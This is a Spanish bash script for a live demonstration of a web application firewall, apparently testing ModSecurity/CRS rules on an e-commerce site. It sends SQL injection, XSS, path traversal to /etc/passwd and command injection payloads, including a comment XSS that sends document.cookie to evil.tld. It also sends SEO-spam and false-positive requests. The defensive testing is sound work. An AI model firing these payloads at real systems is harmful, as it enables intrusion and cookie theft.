#!/usr/bin/env bash
# =============================================================================
# MarketGT - Guion de demostracion en vivo del WAF (sabado 2026-09-26)
# Uso:   ./demo-waf.sh https://marketgt.tudominio.com
# Cada ataque imprime el codigo HTTP y despues se lee el evento del audit log.
# =============================================================================
set -u
BASE="${1:-http://localhost}"
UA="Mozilla/5.0 (MarketGT-Demo)"

sep() { printf '\n\033[1;36m%s\033[0m\n' "=== $* ==="; }
shoot() {
  local nombre="$1"; shift
  printf '\n\033[1m%-42s\033[0m ' "$nombre"
  local code
  code=$(curl -sk -o /dev/null -w '%{http_code}' -A "$UA" "$@")
  if [ "$code" = "403" ]; then printf '\033[1;32mHTTP %s  BLOQUEADO\033[0m\n' "$code"
  else                          printf '\033[1;33mHTTP %s\033[0m\n' "$code"; fi
}

sep "0. Trafico legitimo (tiene que pasar)"
shoot "GET / (portada)"                       "$BASE/"
shoot "GET /productos?buscar=camisa+azul"     "$BASE/productos?buscar=camisa+azul"

sep "1. SQL INJECTION  -> regla 942100 (libinjection), severidad CRITICAL (+5)"
# 942100 usa el detector libinjection. Con ANOMALY_INBOUND=5 un solo acierto
# critico ya alcanza el umbral y 949110 responde 403.
shoot "GET  ' OR 1=1--"                       "$BASE/productos?id=1%27%20OR%201%3D1--"
shoot "GET  UNION SELECT"                     "$BASE/productos?id=-1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users"
shoot "POST en cuerpo urlencoded"             -X POST --data "buscar=admin'--" "$BASE/productos"
shoot "POST en cuerpo JSON"                   -X POST -H 'Content-Type: application/json' \
                                              --data '{"buscar":"1 OR 1=1 UNION SELECT NULL,NULL--"}' "$BASE/api/productos"
# Reglas que tambien deberian aparecer en el log: 942190, 942200, 942260,
# 942430 (caracteres SQL restringidos), 942440 (secuencia de comentario SQL).

sep "2. CROSS-SITE SCRIPTING -> regla 941100 (libinjection XSS), CRITICAL (+5)"
shoot "GET  <script>alert(1)</script>"        "$BASE/productos?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
shoot "GET  img onerror"                      "$BASE/productos?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
shoot "GET  svg onload (941110/941160)"       "$BASE/productos?q=%3Csvg%2Fonload%3Dalert%281%29%3E"
shoot "POST comentario con XSS"               -X POST --data "comentario=<script>fetch('//evil.tld/'+document.cookie)</script>" "$BASE/productos/1/comentarios"

sep "3. PATH TRAVERSAL / LFI -> regla 930110, CRITICAL (+5)"
shoot "GET  ../../etc/passwd"                 "$BASE/descargas?archivo=../../../../etc/passwd"
shoot "GET  codificado %2e%2e%2f"             "$BASE/descargas?archivo=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
# 930120 (fichero del SO) y 930100 (traversal codificado) suelen sumarse.

sep "4. RCE / inyeccion de comando -> reglas 932xxx, CRITICAL"
shoot "GET  ;cat /etc/passwd"                 "$BASE/productos?id=1%3Bcat%20%2Fetc%2Fpasswd"

sep "5. DETECCION DE ESCANER -> regla 913100 (User-Agent de herramienta)"
shoot "GET con UA de sqlmap"                  -A "sqlmap/1.9#stable" "$BASE/"
shoot "GET con UA de nikto"                   -A "Mozilla/5.00 (Nikto/2.5.0)" "$BASE/"

sep "6. METODO NO PERMITIDO -> regla 911100"
shoot "TRACE /"                               -X TRACE "$BASE/"

sep "7. ATAQUES DE SEO (reglas propias 150xx de MarketGT)"
shoot "Spam injection (15010)"                -X POST --data "comentario=Visita <a href='http://pastillas-baratas.ru'>aqui</a>" "$BASE/productos/1/comentarios"
shoot "SEO poisoning (15011)"                 -X POST --data "descripcion=buy cheap viagra online casino" "$BASE/productos/1"
shoot "Cloaking: Googlebot falso (15012)"     -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$BASE/"
shoot "Cloaking por parametro (15013)"        "$BASE/?_escaped_fragment_=1"
shoot "Open redirect / doorway (15015)"       "$BASE/salir?redirect=https://granja-de-enlaces.xyz/"

sep "8. FALSOS POSITIVOS QUE NO DEBEN BLOQUEAR (prueba de tuning)"
shoot "Contrasena con comillas y guiones"     -X POST --data "email=a@b.com&password=O'Brien--2026!" "$BASE/login"
shoot "Descripcion con HTML del vendedor"     -X POST --data "descripcion=<p>Camisa <b>100%25 algodon</b></p>" "$BASE/productos/1"
shoot "Formulario con _method=PUT"            -X POST --data "_method=PUT&nombre=Camisa" "$BASE/productos/1"

printf '\n\033[1;36m=== Ahora lee los eventos: ./leer-audit-log.sh ===\033[0m\n'
